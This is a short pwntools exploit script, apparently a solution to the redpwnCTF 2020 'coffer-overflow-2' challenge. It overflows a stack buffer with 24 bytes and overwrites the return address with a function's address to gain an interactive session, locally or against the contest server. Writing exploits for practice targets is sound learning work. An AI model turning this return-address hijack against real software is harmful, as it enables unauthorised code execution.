from pwn import *

elf = ELF("./coffer-overflow-2")

if args.REMOTE:
    p = remote("2020.redpwnc.tf", 31908)
else:
    p = process(elf.path)

p.recvuntil("ith?\n")
p.sendline("A"*24 + p64(elf.sym.binFunction+1))
p.interactive()
